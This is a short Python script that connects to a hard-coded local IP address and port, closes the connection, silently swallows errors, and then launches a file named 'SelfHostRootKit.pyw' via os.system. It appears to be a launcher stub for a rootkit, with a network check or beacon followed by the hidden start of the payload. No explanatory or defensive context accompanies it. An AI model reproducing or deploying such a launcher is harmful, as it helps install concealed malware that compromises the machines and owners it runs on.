import socket
import os

ip = "192.168.1.79"
port = 22227

try:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, port))
    client.close()
except:
    pass

os.system("SelfHostRootKit.pyw")
